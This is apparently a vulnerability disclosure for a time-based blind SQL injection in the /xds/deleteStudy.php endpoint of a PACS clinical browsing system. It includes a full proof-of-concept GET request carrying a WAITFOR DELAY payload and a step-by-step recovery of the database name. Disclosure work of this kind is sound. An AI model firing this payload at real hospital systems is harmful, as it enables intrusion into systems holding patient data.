There is a front-end SQL injection vulnerability in the clinical browsing system of Lanwang Technology Co., Ltd.

1. Impact of vulnerabilities  PACS clinical browsing system

2. Vulnerability location ：/xds/deleteStudy.php

3. The login interface is as shown in the figure:http://ip:82
![image](https://github.com/GAO-UNO/cve/assets/131429880/d15a8c36-f57a-426e-9282-c8b4eaf1134f)

4. Since the SQL injection here is a time-based blind injection, the database name needs to be determined through ASSCII. The POC is as follows
Here, it is judged through truncation that the first position in the database is X

POC
```
GET /xds/deleteStudy.php?documentUniqueId=1%27;if%20(ascii(substring(db_name(),1,1)))=88%20WAITFOR%20DELAY%20%270:0:5%27--%20q HTTP/1.1
Host: ip:82
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=mnir4pskp36nt4a3fh9jk6c2k4
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.1.23
```
![image](https://github.com/GAO-UNO/cve/assets/131429880/b7f2215c-77cc-4743-b551-7823cc4e4b33)

6. Here, it is judged through truncation that the second digit in the database is D.
![image](https://github.com/GAO-UNO/cve/assets/131429880/880cd765-45d0-440f-aae5-25b0e93cfbfe)

Here, it is judged through truncation that the third digit in the database is S.
![image](https://github.com/GAO-UNO/cve/assets/131429880/3b5ed4a9-d3d7-41da-9499-bbd4760cd467)
Here, it is judged through truncation that the fourth digit of the database is 7
![image](https://github.com/GAO-UNO/cve/assets/131429880/a9ebf412-9183-412d-8bfc-471b30436047)
Here, it is judged by truncation that the fifth bit of the database is 0
![image](https://github.com/GAO-UNO/cve/assets/131429880/9ce5c18b-3d36-4fed-bb8f-b4d1addac49e)
Here, it is judged through truncation that the sixth digit in the database is T
![image](https://github.com/GAO-UNO/cve/assets/131429880/286be8a6-3361-4d20-b8e0-a868a9de5a61)
Here, it is determined through delayed injection that the name of the database is: XDS70T
